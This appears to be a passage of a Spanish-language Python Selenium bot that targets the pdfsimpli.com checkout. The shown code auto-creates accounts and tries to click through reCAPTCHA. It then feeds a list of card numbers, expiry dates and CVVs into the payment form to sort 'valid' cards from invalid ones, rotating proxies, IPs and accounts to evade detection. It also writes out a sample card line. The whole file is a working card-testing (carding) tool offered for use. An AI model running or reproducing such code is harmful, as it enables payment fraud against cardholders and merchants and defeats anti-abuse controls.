                try:
                    checkbox = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable((By.ID, "recaptcha-anchor"))
                    )
                    
                    self.driver.execute_script("arguments[0].click();", checkbox)
                    print("✅ [CAPTCHA] Clic automático en reCAPTCHA realizado")
                    
                    self.driver.switch_to.default_content()
                    
                    time.sleep(3)
                    
                    if self.verificar_desafio_imagenes():
                        print("⚠️ [CAPTCHA] Apareció desafío de imágenes - requiriendo intervención manual")
                        return False
                    else:
                        print("✅ [CAPTCHA] reCAPTCHA resuelto automáticamente")
                        return True
                        
                except Exception as e:
                    print(f"❌ [CAPTCHA] Error haciendo clic en reCAPTCHA: {e}")
                    self.driver.switch_to.default_content()
                    return False
            else:
                print("❌ [CAPTCHA] No se encontró el iframe del reCAPTCHA")
                return False
                
        except Exception as e:
            print(f"❌ [CAPTCHA] Error en resolución automática de reCAPTCHA: {e}")
            self.driver.switch_to.default_content()
            return False

    def verificar_desafio_imagenes(self):
        """Verificar si apareció el desafío de imágenes después del clic"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            
            for iframe in iframes:
                try:
                    src = iframe.get_attribute("src")
                    if src and "google.com/recaptcha/api2/bframe" in src:
                        return True
                except:
                    continue
            
            return False
        except:
            return False

    def esperar_y_resolver_captcha_mejorado(self):
        """Versión mejorada que primero intenta automático y luego manual"""
        try:
            print("🔍 [CAPTCHA] Detectando reCAPTCHA...")
            
            if self.detectar_recaptcha():
                print("🎯 [CAPTCHA] reCAPTCHA detectado, intentando resolución automática...")
                
                if self.resolver_recaptcha_automático():
                    return True
                
                print("⏳ [CAPTCHA] Esperando resolución MANUAL del reCAPTCHA...")
                start_time = time.time()
                
                while time.time() - start_time < 60:
                    if not self.detectar_recaptcha():
                        print("✅ [CAPTCHA] reCAPTCHA resuelto manualmente")
                        return True
                    
                    if self.verificar_error_registro():
                        return False
                    
                    time.sleep(2)
                
                print("❌ [CAPTCHA] Tiempo agotado para reCAPTCHA manual")
                return False
            else:
                print("✅ [CAPTCHA] No se detectó reCAPTCHA, continuando...")
                return True
                
        except Exception as e:
            print(f"⚠️ [CAPTCHA] Error en resolución de reCAPTCHA: {e}")
            return True

    def detectar_recaptcha(self, timeout=1):
        """Detectar si hay un reCAPTCHA v2 en la página"""
        try:
            selectores_recaptcha = [
                "iframe[src*='google.com/recaptcha']",
                ".g-recaptcha",
            ]
            
            for selector in selectores_recaptcha:
                try:
                    elemento = WebDriverWait(self.driver, 0.5).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    if elemento and elemento.is_displayed():
                        return True
                except:
                    continue
            return False
        except Exception:
            return False

    def delay_aleatorio(self, min_seg=0.5, max_seg=1.5):
        """Espera aleatoria optimizada"""
        delay = random.uniform(min_seg, max_seg)
        time.sleep(delay)
        return delay

    def esperar_elemento(self, by, value, timeout=10):
        """Esperar elemento con mejor manejo de errores"""
        try:
            elemento = WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
            return elemento
        except TimeoutException:
            return None

    def esperar_elemento_clicable(self, by, value, timeout=10):
        """Esperar elemento clicable"""
        try:
            elemento = WebDriverWait(self.driver, timeout).until(
                EC.element_to_be_clickable((by, value))
            )
            return elemento
        except TimeoutException:
            return None

    def hacer_clic_seguro(self, elemento, descripcion="elemento"):
        """Hacer clic con manejo de errores"""
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", elemento)
            self.delay_aleatorio(0.3, 0.7)
            elemento.click()
            return True
        except ElementClickInterceptedException:
            try:
                self.driver.execute_script("arguments[0].click();", elemento)
                return True
            except:
                return False
        except Exception:
            return False

    def verificar_archivo_pdf(self):
        """Verificar archivo PDF"""
        try:
            if not os.path.exists(self.ruta_pdf):
                return None
                
            archivos = [f for f in os.listdir(self.ruta_pdf) if f.lower().endswith('.pdf')]
            if not archivos:
                return None
                
            pdf_path = os.path.join(self.ruta_pdf, archivos[0])
            return pdf_path
            
        except Exception:
            return None

    def subir_pdf(self, ruta_pdf):
        """Subir PDF - VERSIÓN ULTRA RÁPIDA"""
        try:
            self.delay_aleatorio(2, 3)
            
            selectores_upload = [
                (By.ID, "ctaHeroButton_link"),
                (By.XPATH, "//button[contains(text(), 'Upload')]"),
            ]
            
            boton_upload = None
            for selector in selectores_upload:
                try:
                    boton_upload = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_upload:
                        break
                except:
                    continue
            
            if not boton_upload:
                return False
                
            if not self.hacer_clic_seguro(boton_upload, "botón de upload"):
                return False
                
            self.delay_aleatorio(1, 2)
            
            inputs_archivo = self.driver.find_elements(By.CSS_SELECTOR, "input[type='file']")
            if not inputs_archivo:
                return False
            
            inputs_archivo[0].send_keys(ruta_pdf)
            
            self.delay_aleatorio(3, 5)
            
            indicadores_exito = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//*[contains(text(), 'Convert')]"),
            ]
            
            for indicador in indicadores_exito:
                try:
                    if WebDriverWait(self.driver, 3).until(EC.presence_of_element_located(indicador)):
                        return True
                except:
                    continue
            
            return True
                
        except Exception:
            return False

    def hacer_clic_convert_continue(self):
        """Hacer clic en ConvertContinue - VERSIÓN ULTRA RÁPIDA"""
        try:
            selectores_convert = [
                (By.ID, "ConvertContinue"),
                (By.XPATH, "//button[contains(text(), 'Convert')]"),
            ]
            
            for selector in selectores_convert:
                try:
                    elemento = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if elemento and elemento.is_displayed():
                        try:
                            elemento.click()
                        except:
                            self.driver.execute_script("arguments[0].click();", elemento)
                        
                        self.delay_aleatorio(2, 3)
                        return True
                except:
                    continue
            
            return False
                
        except Exception:
            return False

    def hacer_clic_descarga(self):
        """Hacer clic en descarga"""
        try:
            elemento = self.esperar_elemento_clicable(By.ID, "congDwnaut", 5)
            if elemento and self.hacer_clic_seguro(elemento, "botón de descarga"):
                self.delay_aleatorio(5, 8)
                return True
            return False
            
        except Exception:
            return False

    def encontrar_elemento_por_varios_selectores(self, selectores, timeout=5):
        """Encontrar elemento por varios selectores"""
        for selector in selectores:
            try:
                elemento = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable(selector)
                )
                return elemento
            except:
                continue
        return None

    def buscar_y_completar_campo_tarjeta_corregido(self, tarjeta_actual):
        """Buscar y completar campo de tarjeta en iframe específico - VERSIÓN RÁPIDA"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 1:
                self.driver.switch_to.frame(iframes[1])
                
                selectores_tarjeta = [
                    (By.ID, "data"),
                    (By.NAME, "cardNumber"),
                ]
                
                for selector in selectores_tarjeta:
                    try:
                        campo = WebDriverWait(self.driver, 1).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo.get_attribute('maxlength')
                        if maxlength and int(maxlength) >= 16:
                            numero_tarjeta = tarjeta_actual['numero']
                            campo.click()
                            campo.clear()
                            campo.send_keys(numero_tarjeta)
                            self.driver.switch_to.default_content()
                            return True
                        
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            
            return self.buscar_y_completar_campo_tarjeta_fallback(tarjeta_actual)
            
        except Exception:
            self.driver.switch_to.default_content()
            return self.buscar_y_completar_campo_tarjeta_fallback(tarjeta_actual)

    def buscar_y_completar_campo_tarjeta_fallback(self, tarjeta_actual):
        """Fallback para buscar campo de tarjeta en todos los iframes - VERSIÓN RÁPIDA"""
        iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
        
        for i, iframe in enumerate(iframes):
            try:
                self.driver.switch_to.frame(iframe)
                
                selectores_tarjeta = [
                    (By.ID, "data"),
                    (By.NAME, "cardNumber"),
                ]
                
                for selector in selectores_tarjeta:
                    try:
                        campo = WebDriverWait(self.driver, 0.5).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo.get_attribute('maxlength')
                        if maxlength and int(maxlength) >= 16:
                            numero_tarjeta = tarjeta_actual['numero']
                            campo.click()
                            campo.clear()
                            campo.send_keys(numero_tarjeta)
                            self.driver.switch_to.default_content()
                            return True
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            except:
                self.driver.switch_to.default_content()
        
        return False

    def buscar_y_completar_nombre(self):
        """Buscar y completar campo de nombre del titular - VERSIÓN RÁPIDA"""
        try:
            nombre_aleatorio = self.generar_nombre_aleatorio()
            selectores_nombre = [
                (By.ID, "checkout_form_card_name"),
                (By.NAME, "cardName"),
            ]
            
            for selector in selectores_nombre:
                try:
                    campo_nombre = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    campo_nombre.click()
                    campo_nombre.clear()
                    campo_nombre.send_keys(nombre_aleatorio)
                    return True
                except:
                    continue
            return False
        except Exception:
            return False

    def marcar_checkbox_terminos(self):
        """Marca el checkbox de términos y condiciones - VERSIÓN RÁPIDA"""
        try:
            selectores_checkbox = [
                (By.ID, "acceptCheckboxMark"),
                (By.XPATH, "//span[@id='acceptCheckboxMark']"),
            ]
            
            checkbox = None
            for selector in selectores_checkbox:
                try:
                    checkbox = WebDriverWait(self.driver, 3).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if checkbox:
                        break
                except:
                    continue
            
            if not checkbox:
                return False
            
            if self.verificar_checkbox_marcado():
                return True
            
            self.driver.execute_script("arguments[0].click();", checkbox)
            time.sleep(0.5)
            
            return self.verificar_checkbox_marcado()
            
        except Exception:
            return False

    def verificar_checkbox_marcado(self):
        """Verificar si el checkbox está realmente marcado"""
        try:
            selectores_verificacion = [
                (By.XPATH, "//span[@id='acceptCheckboxMark' and contains(@class, 'checked')]"),
            ]
            
            for selector in selectores_verificacion:
                try:
                    elemento = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    if elemento:
                        return True
                except:
                    continue
                
            return False
            
        except Exception:
            return False

    def hacer_clic_boton_obtener_documento(self):
        """Hace clic en el botón 'Obtener Mi Documento' - VERSIÓN RÁPIDA"""
        selectores_boton = [
            (By.ID, "btnChargeebeeSubmit"),
            (By.XPATH, "//button[@id='btnChargeebeeSubmit']"),
        ]
        
        boton = self.encontrar_elemento_por_varios_selectores(selectores_boton, timeout=8)
        
        if boton:
            try:
                if boton.is_enabled():
                    self.driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", boton)
                    time.sleep(0.5)
                    
                    try:
                        boton.click()
                    except:
                        self.driver.execute_script("arguments[0].click();", boton)
                    
                    time.sleep(3)
                    return True
                return False
                    
            except Exception:
                return False
        return False

    def proceso_con_tarjeta_rapido(self, tarjeta_actual, numero_iteracion):
        """Proceso RÁPIDO - solo cambia número de tarjeta y CVV - SIN CIERRE PREVIO DE BOTÓN CLOSE"""
        try:
            if not self.verificar_pagina_pago():
                return False

            print(f"\033[91m💳 [TARJETA] TESTEANDO TARJETA {numero_iteracion}: {tarjeta_actual['numero']}\033[0m")
            
            resultado_tarjeta = self.buscar_y_completar_campo_tarjeta_corregido(tarjeta_actual)
            if not resultado_tarjeta:
                return False
            
            resultado_cvv = self.buscar_y_completar_cvv_corregido(tarjeta_actual)
            if not resultado_cvv:
                return False
            
            resultado_boton = self.hacer_clic_boton_obtener_documento()
            if not resultado_boton:
                return False
            
            return True
            
        except Exception:
            return False

    def proceso_con_tarjeta_completo(self, tarjeta_actual, numero_iteracion):
        """Proceso COMPLETO solo para PRIMERA tarjeta - SIN CIERRE PREVIO DE BOTÓN CLOSE"""
        try:
            if not self.verificar_pagina_pago():
                return False

            print(f"\033[91m💳 [TARJETA] TESTEANDO TARJETA {numero_iteracion}: {tarjeta_actual['numero']}\033[0m")
            
            self.buscar_y_completar_nombre()
            self.buscar_y_completar_fecha_corregido(tarjeta_actual)
            
            resultado_tarjeta = self.buscar_y_completar_campo_tarjeta_corregido(tarjeta_actual)
            if not resultado_tarjeta:
                return False
            
            resultado_cvv = self.buscar_y_completar_cvv_corregido(tarjeta_actual)
            if not resultado_cvv:
                return False
            
            self.marcar_checkbox_terminos()
            
            resultado_boton = self.hacer_clic_boton_obtener_documento()
            if not resultado_boton:
                return False
            
            return True
            
        except Exception:
            return False

    def buscar_y_completar_cvv_corregido(self, tarjeta_actual):
        """Buscar y completar CVV en iframe específico - VERSIÓN RÁPIDA"""
        try:
            iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
            if len(iframes) > 6:
                self.driver.switch_to.frame(iframes[6])
                
                selectores_cvv = [
                    (By.XPATH, "//input[@maxlength='4' and (@id='data' or @name='Data')]"),
                ]
                
                for selector in selectores_cvv:
                    try:
                        campo_cvv = WebDriverWait(self.driver, 1).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo_cvv.get_attribute('maxlength')
                        if maxlength == '4':
                            cvv = tarjeta_actual['cvv']
                            campo_cvv.click()
                            campo_cvv.clear()
                            campo_cvv.send_keys(cvv)
                            self.driver.switch_to.default_content()
                            return True
                            
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            
            return self.buscar_y_completar_cvv_fallback(tarjeta_actual)
            
        except Exception:
            self.driver.switch_to.default_content()
            return self.buscar_y_completar_cvv_fallback(tarjeta_actual)

    def buscar_y_completar_cvv_fallback(self, tarjeta_actual):
        """Fallback para buscar CVV en todos los iframes - VERSIÓN RÁPIDA"""
        iframes = self.driver.find_elements(By.TAG_NAME, "iframe")
        
        for i, iframe in enumerate(iframes):
            try:
                self.driver.switch_to.frame(iframe)
                
                selectores_cvv = [
                    (By.XPATH, "//input[@maxlength='4' and (@id='data' or @name='Data')]"),
                ]
                
                for selector in selectores_cvv:
                    try:
                        campo_cvv = WebDriverWait(self.driver, 0.5).until(
                            EC.presence_of_element_located(selector)
                        )
                        
                        maxlength = campo_cvv.get_attribute('maxlength')
                        if maxlength == '4':
                            cvv = tarjeta_actual['cvv']
                            campo_cvv.click()
                            campo_cvv.clear()
                            campo_cvv.send_keys(cvv)
                            self.driver.switch_to.default_content()
                            return True
                    except:
                        continue
                
                self.driver.switch_to.default_content()
            except:
                self.driver.switch_to.default_content()
        
        return False

    def buscar_y_completar_fecha_corregido(self, tarjeta_actual):
        """Buscar y completar campos de fecha de expiración - VERSIÓN RÁPIDA"""
        campos_encontrados = 0
        
        try:
            selectores_mes = [
                (By.NAME, "ccMonthExp"),
                (By.ID, "expmo"),
            ]
            
            for selector in selectores_mes:
                try:
                    select_mes = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    select = Select(select_mes)
                    mes_valor = str(int(tarjeta_actual['mes']))
                    select.select_by_value(mes_valor)
                    campos_encontrados += 1
                    break
                except:
                    continue
        except Exception:
            pass
        
        try:
            selectores_anio = [
                (By.NAME, "ccYearExp"),
                (By.ID, "expyr"),
            ]
            
            for selector in selectores_anio:
                try:
                    select_anio = WebDriverWait(self.driver, 1).until(
                        EC.presence_of_element_located(selector)
                    )
                    select = Select(select_anio)
                    
                    anio_valor = tarjeta_actual['anio']
                    if len(anio_valor) == 2:
                        anio_valor = "20" + anio_valor
                    
                    select.select_by_value(anio_valor)
                    campos_encontrados += 1
                    break
                except Exception:
                    continue
        except Exception:
            pass
        
        return campos_encontrados >= 2

    def hacer_clic_boton_continuar(self):
        """Hacer clic en el botón Continue después del registro - VERSIÓN RÁPIDA"""
        try:
            selectores_continuar = [
                (By.ID, "planPageContinueButton"),
                (By.XPATH, "//button[contains(text(), 'Continue')]"),
            ]
            
            for selector in selectores_continuar:
                try:
                    boton_continuar = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable(selector)
                    )
                    if boton_continuar and boton_continuar.is_displayed():
                        self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", boton_continuar)
                        time.sleep(0.5)
                        
                        try:
                            boton_continuar.click()
                        except:
                            self.driver.execute_script("arguments[0].click();", boton_continuar)
                        
                        time.sleep(3)
                        return True
                except:
                    continue
            
            return True
            
        except Exception:
            return False

    def manejar_registro(self, cuenta):
        """Manejar registro con cuenta específica - VERSIÓN MEJORADA CON reCAPTCHA AUTOMÁTICO"""
        try:
            self.delay_aleatorio(2, 3)
            
            if self.verificar_pagina_pago():
                return True
            
            campo_email = self.esperar_elemento(By.ID, "email", 5)
            if not campo_email:
                return False
                
            campo_password = self.esperar_elemento(By.ID, "password", 5)
            if not campo_password:
                return False
                
            email = cuenta['email']
            password = cuenta['password']
            
            campo_email.clear()
            campo_email.send_keys(email)
            self.delay_aleatorio(0.5, 1)
            
            campo_password.clear()
            campo_password.send_keys(password)
            self.delay_aleatorio(0.5, 1)
            
            boton_registro = self.esperar_elemento_clicable(By.ID, "sign-up", 5)
            if not boton_registro:
                return False
                
            if not self.hacer_clic_seguro(boton_registro, "botón de registro"):
                return False
                
            self.delay_aleatorio(3, 5)
            
            if self.verificar_error_registro():
                return False
            
            if not self.esperar_y_resolver_captcha_mejorado():
                return False
            
            if self.verificar_error_registro():
                return False
            
            self.hacer_clic_boton_continuar()
            
            time.sleep(5)
            
            intentos = 0
            while intentos < 3:
                if self.verificar_pagina_pago():
                    return True
                time.sleep(2)
                intentos += 1
            
            return False
            
        except Exception:
            return False

    def verificar_pagina_pago(self):
        """Verificar si estamos en la página de pago - VERSIÓN RÁPIDA"""
        try:
            elementos_pago = [
                (By.ID, "checkout_form_card_name"),
                (By.ID, "btnChargeebeeSubmit"),
                (By.ID, "acceptCheckboxMark"),
            ]
            
            elementos_encontrados = 0
            for elemento in elementos_pago:
                try:
                    if self.esperar_elemento(elemento[0], elemento[1], 1):
                        elementos_encontrados += 1
                except:
                    continue
            
            return elementos_encontrados >= 2
        except:
            return False

    def ejecutar_flujo_completo(self, datos_tarjeta, numero_tarjeta, cuenta):
        """Ejecutar flujo completo SOLO para PRIMERA tarjeta - VERSIÓN RÁPIDA"""
        try:
            print(f"\033[91m💳 [FLUJO] TESTEANDO TARJETA {numero_tarjeta}: {datos_tarjeta['numero']}\033[0m")
            
            ruta_pdf = self.verificar_archivo_pdf()
            if not ruta_pdf:
                return False
                
            self.driver.get("https://pdfsimpli.com")
            self.delay_aleatorio(2, 3)
            
            pasos = [
                ("Subir PDF", lambda: self.subir_pdf(ruta_pdf)),
                ("Convertir PDF", self.hacer_clic_convert_continue),
                ("Iniciar descarga", self.hacer_clic_descarga),
                ("Registro", lambda: self.manejar_registro(cuenta)),
            ]
            
            for nombre, paso in pasos:
                print(f"🔄 [FLUJO] Ejecutando paso: {nombre}")
                resultado = paso()
                if not resultado:
                    print(f"❌ [FLUJO] Falló en paso: {nombre}")
                    return False
            
            if not self.verificar_pagina_pago():
                return False
            
            if self.proceso_con_tarjeta_completo(datos_tarjeta, numero_tarjeta):
                return self.verificar_resultado_tarjeta(numero_tarjeta, datos_tarjeta)
            else:
                return False
                
        except Exception as e:
            print(f"❌ [FLUJO] Error en flujo completo: {e}")
            return False

    def ejecutar_flujo_tarjeta_rapido(self, datos_tarjeta, numero_tarjeta):
        """Ejecutar flujo rápido para tarjetas posteriores - VERSIÓN RÁPIDA"""
        try:
            if not self.verificar_pagina_pago():
                self.driver.refresh()
                time.sleep(3)
                
                if not self.verificar_pagina_pago():
                    return False
            
            if self.proceso_con_tarjeta_rapido(datos_tarjeta, numero_tarjeta):
                resultado = self.verificar_resultado_tarjeta(numero_tarjeta, datos_tarjeta)
                
                if not resultado:
                    self.limpiar_pagina_despues_de_error()
                
                return resultado
            else:
                return False
                
        except Exception as e:
            print(f"❌ [FLUJO] Error en flujo rápido: {e}")
            return False

    def leer_tarjetas(self):
        """Leer tarjetas desde archivo"""
        try:
            if not os.path.exists(self.archivo_tarjetas):
                self.crear_archivo_ejemplo()
                
            tarjetas = []
            with open(self.archivo_tarjetas, 'r', encoding='utf-8') as f:
                for linea in f:
                    linea = linea.strip()
                    if linea and not linea.startswith('#'):
                        partes = linea.split('|')
                        if len(partes) == 4:
                            tarjetas.append({
                                'numero': partes[0].strip(),
                                'mes': partes[1].strip(),
                                'anio': partes[2].strip(),
                                'cvv': partes[3].strip()
                            })
            
            return tarjetas
            
        except Exception:
            return []

    def crear_archivo_ejemplo(self):
        """Crear archivo de ejemplo"""
        try:
            with open(self.archivo_tarjetas, 'w', encoding='utf-8') as f:
                f.write("# Formato: numero|mes|año|cvv\n")
                f.write("5124013001057531|03|2030|275\n")
        except Exception:
            pass

    def ejecutar_proceso_completo(self):
        """Ejecutar el proceso completo optimizado - VERSIÓN CORREGIDA"""
        print("\n" + "="*60)
        print("🚀 [PROCESO] INICIANDO PROCESO COMPLETO")
        print("="*60)
        
        try:
            print("📁 [PROCESO] Leyendo tarjetas...")
            tarjetas = self.leer_tarjetas()
            
            if not tarjetas:
                print("❌ [PROCESO] No hay tarjetas para procesar")
                return

            print(f"\n🎯 [PROCESO] Procesando {len(tarjetas)} tarjetas")
            print("🔄 [PROCESO] Configurando navegador...")
            
            cuenta_actual = self.obtener_proxima_cuenta()
            if not cuenta_actual:
                print("❌ [PROCESO] No se pudo obtener cuenta inicial")
                return
            
            proxy = self.obtener_proxy_aleatorio()
            if proxy and self.configurar_navegador_con_proxy(proxy):
                self.proxy_actual = proxy
            else:
                if not self.configurar_navegador_sin_proxy():
                    print("❌ [PROCESO] Error configurando navegador")
                    return

            self.obtener_ip_actual()

            tarjetas_procesadas = 0
            tarjetas_validas = 0
            cuentas_usadas_en_esta_ip = 0
            ip_anterior = self.ip_actual
            
            print(f"\n📊 [PROCESO] INICIANDO PROCESAMIENTO:")
            print(f"📊 [PROCESO] - Tarjetas totales: {len(tarjetas)}")
            print(f"📊 [PROCESO] - IP inicial: {ip_anterior}")
            print(f"📊 [PROCESO] - Cuenta actual: {cuenta_actual['email'][:15]}...")
            
            for i, tarjeta in enumerate(tarjetas, 1):
                print(f"\n" + "─" * 50)
                print(f"💳 [{i}/{len(tarjetas)}] PROCESANDO TARJETA {i}")
                print("─" * 50)
                
                if (i-1) > 0 and (i-1) % 6 == 0:
                    print(f"🔄 [IP] Forzando cambio de IP (cada 6 tarjetas)...")
                    resultado = self.forzar_cambio_ip_cada_6_tarjetas(ip_anterior, cuenta_actual, cuentas_usadas_en_esta_ip)
                    if resultado[0]:
                        cuenta_actual, cuentas_usadas_en_esta_ip, ip_anterior = resultado
                    else:
                        break
                
                if cuenta_actual.get('tarjetas_procesadas', 0) >= self.max_tarjetas_por_cuenta:
                    cuentas_usadas_en_esta_ip += 1
                    
                    if cuentas_usadas_en_esta_ip >= 3:
                        nueva_cuenta = self.cambiar_cuenta_con_verificacion_ip()
                        if nueva_cuenta:
                            cuenta_actual = nueva_cuenta
                            cuentas_usadas_en_esta_ip = 1
                            ip_anterior = self.ip_actual
                        else:
                            break
                    else:
                        nueva_cuenta = self.cambiar_cuenta_sin_cambiar_ip()
                        if nueva_cuenta:
                            cuenta_actual = nueva_cuenta
                        else:
                            break
            
                if cuenta_actual.get('tarjetas_procesadas', 0) == 0:
                    exito = self.ejecutar_flujo_completo(tarjeta, i, cuenta_actual)
                else:
                    exito = self.ejecutar_flujo_tarjeta_rapido(tarjeta, i)
                
                self.eliminar_tarjeta_del_archivo(tarjeta)
                
                if exito:
                    self.marcar_cuenta_usada(exito=True)
                    tarjetas_procesadas += 1
                    tarjetas_validas += 1
                    print(f"\033[92m✅ [RESULTADO] TARJETA VÁLIDA {i}: {tarjeta['numero']}\033[0m")
                    
                    print("🔄 [CUENTA] Creando nueva cuenta para la siguiente tarjeta...")
                    nueva_cuenta = self.cambiar_cuenta_con_verificacion_ip()
                    if nueva_cuenta:
                        cuenta_actual = nueva_cuenta
                        cuentas_usadas_en_esta_ip = 1
                        ip_anterior = self.ip_actual
                    else:
                        print("❌ [CUENTA] No se pudo crear nueva cuenta, continuando con cuenta actual")
                    
                else:
                    self.marcar_cuenta_usada(exito=False)
                    print(f"\033[91m❌ [RESULTADO] TARJETA INVÁLIDA {i}: {tarjeta['numero']}\033[0m")
                
                if i < len(tarjetas):
                    time.sleep(0.5)
        
            print(f"\n" + "="*60)
            print("🎉 [PROCESO] PROCESO COMPLETADO")
            print("="*60)
            print(f"📊 [PROCESO] ESTADÍSTICAS FINALES:")
            print(f"📊 [PROCESO] - Tarjetas procesadas: {tarjetas_procesadas}/{len(tarjetas)}")
            print(f"📊 [PROCESO] - Tarjetas válidas: {tarjetas_validas}")
            print(f"📊 [PROCESO] - Efectividad: {(tarjetas_validas/tarjetas_procesadas*100) if tarjetas_procesadas > 0 else 0:.2f}%")
            print(f"💾 [PROCESO] Tarjetas válidas guardadas en: {self.archivo_lives}")
                
        except Exception as e:
            print(f"\n💥 [PROCESO] ERROR CRÍTICO: {e}")
            traceback.print_exc()
        finally:
            if self.driver:
                print("🔄 [PROCESO] Cerrando navegador...")
                self.driver.quit()

# EJECUCIÓN PRINCIPAL
if __name__ == "__main__":
    print("🤖 [INICIO] BOT PDF SIMPLI - VERSIÓN TERMUX CON GENERACIÓN AUTOMÁTICA DE CUENTAS")
    print("📁 [INICIO] Rutas configuradas en: /data/data/com.termux/files/home/bot/")
    print("🔄 [INICIO] El bot generará cuentas automáticamente cuando sea necesario")
    
    bot = BotPDFSimpli()
    bot.ejecutar_proceso_completo()
    
    input("\n🎯 [FIN] Presiona ENTER para salir...")